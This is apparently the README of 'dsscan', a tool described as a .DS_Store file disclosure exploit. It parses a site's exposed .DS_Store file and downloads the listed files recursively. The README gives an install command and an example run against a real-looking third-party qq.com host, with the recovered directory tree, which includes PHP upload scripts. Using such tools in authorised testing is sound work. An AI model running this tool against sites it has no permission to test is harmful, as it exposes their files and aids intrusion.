# dsscan

A **`.DS_Store`** file disclosure exploit. 

It parses .DS_Store file and downloads files recursively.

## Install ##

	pipx install git+https://github.com/w0ltage/dsscan.git

## Example ##

	ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store

	hd.zj.qq.com/
	└── themes
	    └── galaxyw
	        ├── app
	        │   └── css
	        │       └── style.min.css
	        ├── cityData.min.js
	        ├── images
	        │   └── img
	        │       ├── bg-hd.png
	        │       ├── bg-item-activity.png
	        │       ├── bg-masker-pop.png
	        │       ├── btn-bm.png
	        │       ├── btn-login-qq.png
	        │       ├── btn-login-wx.png
	        │       ├── ico-add-pic.png
	        │       ├── ico-address.png
	        │       ├── ico-bm.png
	        │       ├── ico-duration-time.png
	        │       ├── ico-pop-close.png
	        │       ├── ico-right-top-delete.png
	        │       ├── page-login-hd.png
	        │       ├── pic-masker.png
	        │       └── ticket-selected.png
	        └── member
	            ├── assets
	            │   ├── css
	            │   │   ├── ace-reset.css
	            │   │   └── antd.css
	            │   └── lib
	            │       ├── cityData.min.js
	            │       └── ueditor
	            │           ├── index.html
	            │           ├── lang
	            │           │   └── zh-cn
	            │           │       ├── images
	            │           │       │   ├── copy.png
	            │           │       │   ├── localimage.png
	            │           │       │   ├── music.png
	            │           │       │   └── upload.png
	            │           │       └── zh-cn.js
	            │           ├── php
	            │           │   ├── action_crawler.php
	            │           │   ├── action_list.php
	            │           │   ├── action_upload.php
	            │           │   ├── config.json
	            │           │   ├── controller.php
	            │           │   └── Uploader.class.php
	            │           ├── ueditor.all.js
	            │           ├── ueditor.all.min.js
	            │           ├── ueditor.config.js
	            │           ├── ueditor.parse.js
	            │           └── ueditor.parse.min.js
	            └── static
	                ├── css
	                │   └── page.css
	                ├── img
	                │   ├── bg-table-title.png
	                │   ├── bg-tab-say.png
	                │   ├── ico-black-disabled.png
	                │   ├── ico-black-enabled.png
	                │   ├── ico-coorption-person.png
	                │   ├── ico-miss-person.png
	                │   ├── ico-mr-person.png
	                │   ├── ico-white-disabled.png
	                │   └── ico-white-enabled.png
	                └── scripts
	                    ├── js
	                    └── lib
	                        └── jquery.min.js
	
	21 directories, 48 files
